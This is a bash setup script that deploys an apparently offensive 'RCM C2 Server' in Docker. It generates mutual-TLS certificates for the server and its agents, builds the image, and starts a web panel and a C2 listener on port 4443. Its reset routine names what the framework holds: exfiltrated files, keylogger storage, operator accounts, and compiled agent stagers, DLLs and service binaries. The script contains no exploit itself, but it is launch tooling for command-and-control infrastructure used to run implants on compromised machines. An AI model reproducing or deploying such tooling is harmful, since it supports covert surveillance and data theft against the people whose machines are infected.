#!/usr/bin/env bash
# start_docker.sh — Full RCM stack setup and launch
# Generates certs, fixes permissions, and starts the server in one shot.
#
# Usage:
#   ./start_docker.sh           — normal start
#   ./start_docker.sh --reset   — wipe all persistent data, then start fresh
set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; CLR_RESET='\033[0m'

info()    { echo -e "${CYAN}[*]${CLR_RESET} $*"; }
success() { echo -e "${GREEN}[+]${CLR_RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${CLR_RESET} $*"; }
die()     { echo -e "${RED}[-] ERROR:${CLR_RESET} $*" >&2; exit 1; }
must_sudo() { sudo "$@"; }

# ── Sanity checks ─────────────────────────────────────────────────────
command -v docker >/dev/null 2>&1 || die "docker not found. Install Docker first."
docker compose version >/dev/null 2>&1 || die "docker compose plugin not found."

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

[[ -f Dockerfile ]]         || die "Dockerfile not found. Run this script from the project root."
[[ -f docker-compose.yml ]] || die "docker-compose.yml not found."

sudo -v || die "sudo authentication failed. Re-run with a user that has sudo access."

# ── Parse flags ────────────────────────────────────────────────────────
DO_RESET=false
for arg in "$@"; do
    case "$arg" in
        --reset) DO_RESET=true ;;
    esac
done

# ── Step 0 (optional): Reset all persistent data ──────────────────────
if $DO_RESET; then
    echo ""
    echo -e "${RED}${BOLD}  !! RESET MODE !!${CLR_RESET}"
    echo -e "${YELLOW}  This will permanently delete:${CLR_RESET}"
    echo "    • c2_audit.db        (all sessions, operators, build keys, listeners, audit log)"
    echo "    • certs/             (TLS certificates — will be regenerated)"
    echo "    • downloads/         (all exfiltrated files)"
    echo "    • data/              (keylogger storage)"
    echo "    • logs/              (server logs)"
    echo "    • dist/              (compiled agent binaries and server_keys.json)"
    echo "    • history.txt        (CLI command history)"
    echo ""
    read -r -p "  Are you sure? [y/N] " confirm
    case "$confirm" in
        [yY][eE][sS]|[yY]) ;;
        *) echo "Aborted."; exit 0 ;;
    esac
    echo ""

    if docker compose ps rcm-server 2>/dev/null | grep -q "running"; then
        info "Stopping running container before reset..."
        docker compose down
        success "Container stopped."
    fi

    info "Deleting persistent data..."

    must_sudo rm -rf c2_audit.db
    touch c2_audit.db
    success "Reset c2_audit.db"

    must_sudo rm -f certs/ca.crt  certs/ca.key  certs/ca.srl  \
          certs/server.crt  certs/server.key  certs/server.key.der  certs/server.csr  \
          certs/client.crt  certs/client.key  certs/client.key.der  certs/client.csr \
          2>/dev/null || true
    success "Deleted certs/"

    must_sudo rm -rf downloads/ data/ logs/
    mkdir -p downloads data logs
    success "Deleted downloads/, data/, logs/"

    must_sudo rm -f dist/*.exe dist/exe_* dist/dll_* dist/service_* dist/stager_* \
          dist/server_keys.json 2>/dev/null || true
    success "Deleted dist/ artifacts"

    rm -f history.txt
    success "Deleted history.txt"

    echo ""
    success "Reset complete. The server will create a fresh admin account on first start."
    echo ""
fi

# ── Step 1: Create host directories and required files ─────────────────
info "Creating runtime directories..."
mkdir -p certs logs downloads data modules extensions dist

if [[ -d c2_audit.db ]]; then
    warn "c2_audit.db is a directory — fixing..."
    must_sudo rm -rf c2_audit.db
fi
[[ -f c2_audit.db ]] || touch c2_audit.db

# ── Step 2: Generate TLS certificates ─────────────────────────────────
NEED_CERTS=false
for f in certs/ca.crt certs/server.crt certs/server.key.der \
          certs/client.crt certs/client.key.der; do
    [[ ! -s "$f" ]] && { NEED_CERTS=true; break; }
done

if $NEED_CERTS; then
    # ── Collect ALL local IPs to embed in the server cert SAN ─────────
    # rustls validates that the IP/hostname the agent dials appears in the
    # server certificate's SubjectAltName. We gather every non-loopback IP
    # the host has so agents can reach the server from any network interface.
    info "Detecting host IP addresses for certificate SAN..."

    # Collect IPs: all inet addresses, strip prefix lengths.
    HOST_IPS=()
    while IFS= read -r ip; do
        # Strip every possible trailing whitespace character
        clean="$(printf '%s' "$ip" | tr -d '\r\n\t')"
        [[ -n "$clean" ]] && HOST_IPS+=("$clean")
    done < <(ip -4 addr show 2>/dev/null \
        | grep -oP '(?<=inet\s)\d+(\.\d+){3}' \
        || ifconfig 2>/dev/null \
        | grep -oP '(?<=inet\s)\d+(\.\d+){3}' \
        || true)

    # Always include loopback
    HOST_IPS+=("127.0.0.1")

    # Deduplicate
    readarray -t HOST_IPS < <(printf '%s\n' "${HOST_IPS[@]}" | sort -u)

    info "Will embed these IPs in server cert SAN:"
    for ip in "${HOST_IPS[@]}"; do
        echo "    IP: $ip"
    done

    # Write the SAN section to a temp FILE rather than passing it via
    # docker -e. Multiline env vars passed via -e are unreliable — bash
    # can corrupt the last line (turning a trailing \n into a literal 'n'),
    # which causes openssl to reject the IP as "bad ip address".
    SAN_FILE="$(mktemp /tmp/san_XXXXXX.cnf)"
    {
        printf 'DNS.1 = rcm-server\n'
        printf 'DNS.2 = localhost\n'
        printf 'DNS.3 = %s\n' "$(hostname -f 2>/dev/null || hostname)"
        ip_idx=1
        for ip in "${HOST_IPS[@]}"; do
            clean_ip="$(printf '%s' "${ip}" | tr -d '\r\n\t')"
            [[ -z "$clean_ip" ]] && continue
            printf 'IP.%d = %s\n' "$ip_idx" "$clean_ip"
            ((ip_idx++))
        done
    } > "$SAN_FILE"

    echo ""
    echo "=== server_san section (will be appended to openssl.cnf) ==="
    cat "$SAN_FILE"
    echo "============================================================="
    echo ""

    info "Generating X.509 v3 certificates..."

    docker run --rm \
        -v "$(pwd)/certs:/certs" \
        -v "${SAN_FILE}:/tmp/san.cnf:ro" \
        debian:bookworm-slim \
        bash -c '
            set -e
            apt-get update -qq
            apt-get install -y -qq openssl 2>/dev/null

            # Write the static part of the OpenSSL config
            cat > /tmp/openssl.cnf << CONFEOF
[req]
distinguished_name = req_dn
prompt             = no
x509_extensions    = v3_ca

[req_dn]
CN = RCM-CA
O  = RCM
C  = US

[v3_ca]
subjectKeyIdentifier   = hash
authorityKeyIdentifier = keyid:always,issuer
basicConstraints       = critical,CA:TRUE
keyUsage               = critical,keyCertSign,cRLSign

[v3_server]
subjectKeyIdentifier   = hash
authorityKeyIdentifier = keyid,issuer
basicConstraints       = critical,CA:FALSE
keyUsage               = critical,digitalSignature,keyEncipherment
extendedKeyUsage       = serverAuth
subjectAltName         = @server_san

[v3_client]
subjectKeyIdentifier   = hash
authorityKeyIdentifier = keyid,issuer
basicConstraints       = critical,CA:FALSE
keyUsage               = critical,digitalSignature
extendedKeyUsage       = clientAuth

[server_san]
CONFEOF
            # Append the SAN entries from the mounted file (no env var corruption)
            cat /tmp/san.cnf >> /tmp/openssl.cnf

            # CA
            openssl genrsa -out /certs/ca.key 4096 2>/dev/null
            openssl req -x509 -new -nodes \
                -config /tmp/openssl.cnf \
                -extensions v3_ca \
                -key /certs/ca.key \
                -sha256 -days 3650 \
                -out /certs/ca.crt

            # Server cert
            openssl genrsa -out /certs/server.key 4096 2>/dev/null
            openssl req -new -nodes \
                -key /certs/server.key \
                -subj "/CN=rcm-server/O=RCM/C=US" \
                -out /certs/server.csr
            openssl x509 -req \
                -in /certs/server.csr \
                -CA /certs/ca.crt -CAkey /certs/ca.key -CAcreateserial \
                -extfile /tmp/openssl.cnf -extensions v3_server \
                -sha256 -days 3650 \
                -out /certs/server.crt
            openssl pkcs8 -topk8 -nocrypt \
                -in /certs/server.key -out /certs/server.key.der -outform DER

            # Client cert
            openssl genrsa -out /certs/client.key 4096 2>/dev/null
            openssl req -new -nodes \
                -key /certs/client.key \
                -subj "/CN=rcm-agent/O=RCM/C=US" \
                -out /certs/client.csr
            openssl x509 -req \
                -in /certs/client.csr \
                -CA /certs/ca.crt -CAkey /certs/ca.key -CAcreateserial \
                -extfile /tmp/openssl.cnf -extensions v3_client \
                -sha256 -days 3650 \
                -out /certs/client.crt
            openssl pkcs8 -topk8 -nocrypt \
                -in /certs/client.key -out /certs/client.key.der -outform DER

            # Verify chain
            openssl verify -CAfile /certs/ca.crt /certs/server.crt \
                && echo "  [+] server.crt chain: OK"
            openssl verify -CAfile /certs/ca.crt /certs/client.crt \
                && echo "  [+] client.crt chain: OK"

            echo ""
            echo "Server cert SANs:"
            openssl x509 -in /certs/server.crt -noout -text \
                | grep -A1 "Subject Alternative Name"
            echo ""
            echo "Certs OK"
        '
    # Clean up the temp SAN file
    rm -f "$SAN_FILE"
    success "Certificates generated."
else
    info "Certificates already present, skipping generation."
    info "Run with --reset to regenerate if you changed the server IP."
fi

# ── Step 3: Fix ownership ──────────────────────────────────────────────
info "Setting ownership to uid 1000 (sudo required)..."
must_sudo chown -R 1000:1000 \
    certs logs downloads data modules extensions dist c2_audit.db
must_sudo chmod 755 certs logs downloads data modules extensions dist
must_sudo chmod 644 certs/*.crt certs/*.csr 2>/dev/null || true
must_sudo chmod 600 certs/*.key certs/*.der  2>/dev/null || true
must_sudo chmod 644 c2_audit.db
success "Ownership set."

# ── Step 4: Build image ───────────────────────────────────────────────
info "Building Docker image (first build: 10-20 min compiling Rust)..."
docker compose build --no-cache rcm-server
success "Image built."

# ── Step 5: Start the server ──────────────────────────────────────────
info "Starting rcm-server..."
docker compose up -d rcm-server
success "Container started."

# ── Step 6: Wait for server to initialise ─────────────────────────────
info "Waiting for server to initialise (up to 60s)..."
READY=false
for i in $(seq 1 60); do
    if docker compose logs rcm-server 2>/dev/null | grep -q "API Endpoint"; then
        READY=true
        break
    fi
    sleep 1
done

if ! $READY; then
    echo ""
    warn "Server did not report ready within 60s. Last 20 log lines:"
    docker compose logs --tail=20 rcm-server 2>/dev/null | sed 's/^/  /'
    echo ""
    die "Server failed to start — see logs above."
fi

# ── Step 7: Print summary ─────────────────────────────────────────────
echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${CLR_RESET}"
echo -e "${GREEN}${BOLD}  RCM C2 Server is up${CLR_RESET}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${CLR_RESET}"
echo ""
echo -e "  ${CYAN}Web Panel${CLR_RESET}   →  http://127.0.0.1:8080"
echo -e "  ${CYAN}C2 Listener${CLR_RESET} →  tls://0.0.0.0:4443"
echo ""

echo -e "${YELLOW}${BOLD}  Server startup log:${CLR_RESET}"
docker compose logs rcm-server 2>/dev/null \
    | grep -v "^$" \
    | sed 's/^rcm-server  | //' \
    | sed 's/^/  /'
echo ""

echo -e "  ${CYAN}Follow logs${CLR_RESET}  →  docker compose logs -f rcm-server"
echo -e "  ${CYAN}Stop${CLR_RESET}         →  docker compose down"
echo -e "  ${CYAN}Full reset${CLR_RESET}   →  $0 --reset"
echo -e ""
echo -e "  ${YELLOW}NOTE:${CLR_RESET} If you add a new network interface or change the server IP,"
echo -e "  run ${CYAN}$0 --reset${CLR_RESET} to regenerate certs with the new IP in the SAN."
echo ""
